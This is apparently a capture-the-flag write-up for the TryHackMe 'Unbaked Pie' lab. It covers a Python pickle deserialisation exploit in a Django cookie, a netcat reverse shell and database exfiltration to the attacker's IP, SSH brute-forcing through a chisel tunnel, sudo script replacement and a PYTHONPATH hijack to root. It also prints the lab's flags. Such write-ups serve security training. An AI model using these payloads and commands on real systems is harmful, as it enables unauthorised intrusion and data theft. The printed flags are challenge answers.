# Unbaked Pie

Don't over-baked your pie!

Please allow 5 minutes for this instance to fully deploy before attacking. This VM was developed in collaboration with @ch4rm, thanks to him for the foothold and privilege escalation ideas. 

# User Flag

## Services

Running Nmap will only reveal 1 open port:

~~~
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 05 Jun 2021 05:28:13 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=gUg8DDUyJ5P5vaMKslwVHlS7qW7Q5vYjs4UxckkYelW73hYuVAHq8hLZqB7EWefU; expires=Sat, 04 Jun 2022 05:28:13 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 05 Jun 2021 05:28:13 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=rwqtwMQ29bIScFVPUUG4IoatqxRpw1jCThInxLE125FUHiakfnwMMATVxzIaymtl; expires=Sat, 04 Jun 2022 05:28:13 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
~~~

## Django application

Browsing the `robots.txt` page leads to a 404 error page with the below debug message as `DEBUG` is set to `True` in the Django application. It discloses all possible locations in the application:

~~~
Page not found (404)
Request Method: 	GET
Request URL: 	http://10.10.101.128:5003/robots.txt

Using the URLconf defined in bakery.urls, Django tried these URL patterns, in this order:

    admin/
    [name='home']
    share [name='share']
    search [name='search']
    about [name='about']
    <slug:slug> [name='detail']
    accounts/
    ^static/(?P<path>.*)$
    ^media/(?P<path>.*)$

The current path, robots.txt, didn't match any of these.
~~~

## Pickle in the search

Intercepting all requests in BurpSuite leads to understanding that there is a pickle stored in the `search_cookie`:

~~~
HTTP/1.1 200 OK
Date: Sat, 05 Jun 2021 05:59:09 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 5878
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  search_cookie="gASVCQAAAAAAAACMBWFwcGxllC4="; Path=/
Set-Cookie:  csrftoken=UUD6QtcPz63MKhSdQJgK91xyDjsWUxWIrN8wR9LOLwJffuO3EQzY5Ul2kkccId2f; expires=Sat, 04 Jun 2022 05:59:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax
~~~

This seems to be a pickle string that stores the content of the last searched string:

```python
$ python3            
>>> import pickle
>>> import base64
>>> s = "gASVCQAAAAAAAACMBWFwcGxllC4="
>>> base64.b64decode(s)
b'\x80\x04\x95\t\x00\x00\x00\x00\x00\x00\x00\x8c\x05apple\x94.'
>>> pickle.loads(base64.b64decode(s))
'apple'
```

## Exploit

Searching for exploits on python pickles led me to this [resource](https://davidhamann.de/2020/04/05/exploiting-python-pickle/), and I adapted the script to make a reverse shell:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.50.72 4444 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Running the script gives me the following base64 encoded pickle:

~~~
$ python3 makepickle.py 
b'gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjUwLjcyIDQ0NDQgPi90bXAvZpSFlFKULg=='
~~~

Now, intercept the request in BurpSuite and modify the value of the `search_cookie`:

~~~
POST /search HTTP/1.1
Host: 10.10.101.128:5003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.101.128:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://10.10.101.128:5003
Connection: close
Cookie: csrftoken=UUD6QtcPz63MKhSdQJgK91xyDjsWUxWIrN8wR9LOLwJffuO3EQzY5Ul2kkccId2f; search_cookie="gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjUwLjcyIDQ0NDQgPi90bXAvZpSFlFKULg=="
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=bU0PAWeQasy8PgUEVezIo4poKG4QSGq0INvfBCNPmSeBktQuJlSWkXdSrHO6Gmwx&query=apple
~~~

Now we have a reverse shell. We are `root` but there is no flag in the `/root` directory, and it seems that we are running in a docker environment:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ nc -nlvp 4444         
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.101.128] 36542
/bin/sh: 0: can't access tty; job control turned off
# python3 -c "import pty;pty.spawn('/bin/bash')"
root@8b39a559b296:/home# id
id
uid=0(root) gid=0(root) groups=0(root)
root@8b39a559b296:/home# cd /root
cd /root
root@8b39a559b296:~# ll
ll
bash: ll: command not found
root@8b39a559b296:~# ls -la
ls -la
total 36
drwx------ 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
-rw------- 1 root root  889 Oct  6  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x 3 root root 4096 Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4096 Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
root@8b39a559b296:/home/site# ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
~~~

## Evade docker

The `.bash_history` file discloses and interesting command, and we understand that `ramsey` is a valid user to the SSH connection to the main host.

~~~
root@8b39a559b296:/home/site# cat /root/.bash_history
cat /root/.bash_history
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1 <---------------------- interesting
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
~~~

## Database

However, we don't know ramsey's password. I first tried to get the sqlite3 database (Django database) to find credentials, but it seemed to be a rabbit hole.

In Kali:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ nc -l -p 9999 > db.sqlite3
~~~

On the target:

~~~
root@8b39a559b296:/home/site# nc -w 3 10.8.50.72 9999 < db.sqlite3
nc -w 3 10.8.50.72 9999 < db.sqlite3
~~~

We can dump the `auth_user` table:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ sqlite3 db.sqlite3      
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions
sqlite> select * from auth_user;
1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
~~~

But I was not able to crack these hashes (aborted the hashcat process after 2 hours).

~~~
$ cat ramsey.hash
ramsey:pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
$ hashcat -m 10000 --username ramsey.hash /usr/share/wordlists/rockyou.txt
~~~

## Brute force ramsey's SSH account

Neither `ssh` nor `socat` are installed on the docker container. Let's use `chisel`.

On Kali:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ ./chisel server -p 2223 --reverse
~~~

On the target:

~~~
root@8b39a559b296:/home# ./chisel client 10.8.50.72:2223 R:22:172.17.0.1:22
~~~

Now, let's crack `ramsey`'s accont:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://localhost                                        255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-05 09:26:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://localhost:22/
[22][ssh] host: localhost   login: ramsey   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-05 09:26:44
~~~

## Ramsey's flag

We can now connect as ramsey:

~~~
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ sshpass -p "12345678" ssh ramsey@localhost                                                                127 ⨯
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


Last login: Tue Oct  6 22:39:31 2020 from 172.17.0.2
ramsey@unbaked:~$ ll
total 48
drwxr-xr-x 5 ramsey ramsey 4096 Oct  6  2020 ./
drwxr-xr-x 4 root   root   4096 Oct  3  2020 ../
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 ramsey ramsey 3771 Oct  3  2020 .bashrc
drwx------ 3 ramsey ramsey 4096 Oct  3  2020 .cache/
drwx------ 4 ramsey ramsey 4096 Oct  3  2020 .local/
drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano/
-rwxrw-r-- 1 ramsey ramsey 1645 Oct  3  2020 payload.png*
-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile
-rw-r--r-- 1 root   root     38 Oct  6  2020 user.txt
-rw-r--r-- 1 root   ramsey 4369 Oct  3  2020 vuln.py
ramsey@unbaked:~$ cat user.txt 
THM{ce778dd41bec31e1daed77ebebcd7423}
~~~

User flag: `THM{ce778dd41bec31e1daed77ebebcd7423}`

# Root Flag

## Lateral move (ramsey -> oliver)

Ramsey can run `vuln.py` as `oliver`:

~~~
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
~~~

Below is the content of the script:


```python
ramsey@unbaked:~$ cat vuln.py 
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
    banner = '''\033[33m                                             
                      (
                       )
                      __..---..__
                  ,-='  /  |  \  `=-.
                 :--..___________..--;
                  \.,_____________,./
         

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
        return banner

#Function Instructions
def instructions():
    print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
    print "\t\t\t","1. Calculator"
    print "\t\t\t","2. Easy Calculator"
    print "\t\t\t","3. Credits"
    print "\t\t\t","4. Exit"
    print "\t\t\t",28 * "-"

def instructions2():
    print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
    print "\t\t\t","1. Add"
    print "\t\t\t","2. Subtract"
    print "\t\t\t","3. Multiply"
    print "\t\t\t","4. Divide"
    print "\t\t\t","5. Back"
    print "\t\t\t",28 * "-"
    
def credits():
    print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"
    
# Function Arithmetic

# Function to add two numbers  
def add(num1, num2): 
    return num1 + num2 
  
# Function to subtract two numbers  
def subtract(num1, num2): 
    return num1 - num2 
  
# Function to multiply two numbers 
def multiply(num1, num2): 
    return num1 * num2 
  
# Function to divide two numbers 
def divide(num1, num2): 
    return num1 / num2 
# Main      
if __name__ == "__main__":
    print header()
    
    #Variables
    OPTIONS = 0
    OPTIONS2 = 0
    TOTAL = 0
    NUM1 = 0
    NUM2 = 0

    while(OPTIONS != 4):
        instructions()
        OPTIONS = int(input("\t\t\tEnter Options >> "))
            print "\033c"
        if OPTIONS == 1:
            instructions2()
            OPTIONS2 = int(input("\t\t\tEnter Options >> "))
            print "\033c"
            if OPTIONS2 == 5:
                continue
            else:
                NUM1 = int(input("\t\t\tEnter Number1 >> "))
                NUM2 = int(input("\t\t\tEnter Number2 >> "))
                if OPTIONS2 == 1:
                    TOTAL = add(NUM1,NUM2)
                if OPTIONS2 == 2:
                    TOTAL = subtract(NUM1,NUM2)
                if OPTIONS2 == 3:
                    TOTAL = multiply(NUM1,NUM2)
                if OPTIONS2 == 4:
                    TOTAL = divide(NUM1,NUM2)
                print "\t\t\tTotal >> $",TOTAL
        if OPTIONS == 2:
            animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

            print "\r\t\t\t     Waiting to extract..."
            for i in range(len(animation)):
                time.sleep(0.5)
                sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
                sys.stdout.flush()

            LISTED = pytesseract.image_to_string(Image.open('payload.png')) 

            TOTAL = eval(LISTED)
            print "\n\n\t\t\tTotal >> $",TOTAL
        if OPTIONS == 3:
            credits()
    sys.exit(-1)
    
```

At this stage, it seems we have 2 ways of moving forward. Either we find an exploit on the python script itself, or we replace the content of the script, as it is in our home folder.

The script is owned by `root` and we only have read access to the file:

~~~
ramsey@unbaked:~$ ls -l /home/ramsey/vuln.py 
-rw-r--r-- 1 root ramsey 4369 Oct  3  2020 /home/ramsey/vuln.py
~~~

However, the file is in our home folder, and we can rename it. Let's take advantage of this to replace its content:

~~~
ramsey@unbaked:~$ cat > /home/ramsey/vuln2.py << EOF
> #!/usr/bin/python
> import pty
> pty.spawn('/bin/bash')
> EOF
ramsey@unbaked:~$ mv vuln.py vuln.bak
ramsey@unbaked:~$ cp vuln2.py vuln.py 
~~~

Now, running our modified copy will grant access as `oliver`:

~~~
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
~~~

## Privilege escalation

Our new user can run `dockerScript.py` as `root` without password, and can set the environment variable as well (`SETENV`).

~~~
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
~~~

The script is importing the `docker` library:

~~~
oliver@unbaked:~$ ls -l /opt/dockerScript.py 
-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py
oliver@unbaked:~$ cat /opt/dockerScript.py 
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
~~~

As we can set the environment variable, let's create our own `docker` library:

~~~
oliver@unbaked:/home/oliver$ cat > /home/oliver/docker.py << EOF
> import pty
> pty.spawn('/bin/bash')
> EOF
~~~

Now, we can run the script as follows, to get a root access:

~~~
oliver@unbaked:/home/oliver$ sudo PYTHONPATH=/home/oliver /usr/bin/python /opt/dockerScript.py
root@unbaked:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root)
root@unbaked:/home/oliver# cat /root/
.bash_history  .cache/        .profile       
.bashrc        .nano/         root.txt       
root@unbaked:/home/oliver# cat /root/root.txt 
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{1ff4c893b3d8830c1e188a3728e90a5f}
~~~

Root flag: `THM{1ff4c893b3d8830c1e188a3728e90a5f}`
